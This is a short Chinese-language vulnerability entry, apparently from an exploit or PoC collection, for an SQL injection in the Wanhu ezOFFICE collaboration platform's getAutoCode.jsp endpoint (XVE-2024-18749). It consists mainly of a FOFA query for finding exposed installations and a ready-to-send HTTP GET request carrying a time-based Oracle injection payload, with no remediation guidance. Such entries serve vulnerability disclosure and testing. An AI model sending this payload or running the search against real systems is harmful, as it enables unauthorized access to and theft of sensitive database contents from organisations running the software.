# 万户ezOFFICE协同管理平台getAutoCode存在SQL注入漏洞(XVE-2024-18749)

万户ezOFFICE协同管理平台 `/defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp`接口处存在sql注入漏洞，攻击者可获取数据库中敏感信息

## fofa

```yaml
app="万户网络-ezOFFICE"
```


## poc

```yaml
GET /defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C5%29--+YJdO&field=field_name&tabName=tfield HTTP/1.1
Host:
```

